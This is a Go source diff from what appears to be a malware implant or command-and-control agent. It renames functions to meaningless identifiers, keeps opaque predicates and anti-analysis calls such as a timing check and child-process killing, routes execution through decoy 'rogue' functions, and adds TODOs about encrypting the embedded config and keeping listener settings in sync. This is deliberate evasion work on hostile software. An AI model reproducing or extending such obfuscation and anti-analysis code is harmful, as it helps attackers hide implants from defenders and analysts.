@@ -35,11 +35,11 @@ type unknown struct {
 	primaryField bool
 }
 
-func opaqueBasedOnModulo(x int) bool {
+func BB176245(x int) bool {
 	return (x*x+2*x+1)%2 == 1 // This is always odd for x != -1
 }
 
-func runTimeCheck() bool {
+func BB23598623() bool {
 	hidden := unknown{primaryField: false}
 	v := b.ValueOf(hidden)
 	return v.Field(0).Bool()
@@ -76,18 +76,22 @@ func X1A9T(x int) bool {
 func main() {
 	/*
 		Todo:
-		The config should be encrypted at compile time
+		The config should be encrypted at compile time [x]
 		Values gotten from it should be decrypted upon use
+		Then garbage collected and repeat the cycle every use
+
+		makefile needs adjusting to determine if listeners use compression/auth
+		and the paths they use, otherwise can get out of sync
 	*/
 	anti.TimingCheck()
 	anti.KillTheChild()
-	switch runTimeCheck() {
+	switch BB23598623() {
 	case true:
 		rogue.Func549687354()
 		rogue.FuncDF7858354()
 		goto XXSFDgs12
 	case false:
-		if opaqueBasedOnModulo(42) {
+		if BB176245(42) {
 			// Load configuration from embedded data
 			conf, err := shared.LoadConfig()
 			if err != nil {
@@ -130,7 +134,7 @@ func main() {
 					if err != nil {
 						return
 					}
-					// Defer closing the response body until the for loop breaks
+
 					defer func(Body io.ReadCloser) {
 						err := Body.Close()
 						if err != nil {
